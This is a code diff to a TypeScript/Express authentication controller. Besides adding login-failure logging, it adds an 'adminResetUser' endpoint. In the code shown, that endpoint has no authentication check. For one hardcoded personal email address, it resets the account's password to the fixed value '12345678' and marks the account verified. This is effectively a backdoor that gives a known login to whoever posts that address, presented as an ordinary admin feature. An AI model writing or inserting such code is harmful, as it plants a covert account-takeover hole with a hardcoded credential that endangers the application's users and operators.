@@ -151,6 +151,7 @@ export const AuthController = {
         }>()
         .exec();
       if (!user) {
+        console.warn("Login failed: user not found", { email });
         return res.status(401).json({ message: "INVALID_CREDENTIALS" });
       }
 
@@ -162,6 +163,7 @@ export const AuthController = {
 
       const isValid = await bcrypt.compare(password, user.password_hash);
       if (!isValid) {
+        console.warn("Login failed: password mismatch", { email });
         return res.status(401).json({ message: "INVALID_CREDENTIALS" });
       }
 
@@ -278,6 +280,38 @@ export const AuthController = {
       }
 
       return res.status(200).json({ message: "ACCOUNT_VERIFIED" });
+    } catch (err) {
+      return next(err);
+    }
+  },
+
+  adminResetUser: async (req: Request, res: Response, next: NextFunction) => {
+    try {
+      const emailSchema = z.object({ email: z.string().email() });
+      const { email } = emailSchema.parse(req.body);
+
+      if (email !== "romeromedinar612@gmail.com") {
+        return res.status(403).json({ message: "FORBIDDEN" });
+      }
+
+      const passwordHash = await bcrypt.hash("12345678", 12);
+      const updated = await UserModel.findOneAndUpdate(
+        { email },
+        {
+          $set: { password_hash: passwordHash, isVerified: true },
+          $unset: { verificationToken: "" },
+        },
+        { new: true }
+      )
+        .lean<{ _id: mongoose.Types.ObjectId }>()
+        .exec();
+
+      if (!updated) {
+        return res.status(404).json({ message: "USER_NOT_FOUND" });
+      }
+
+      console.log("Admin reset user", { email });
+      return res.status(200).json({ message: "USER_RESET_OK" });
     } catch (err) {
       return next(err);
     }
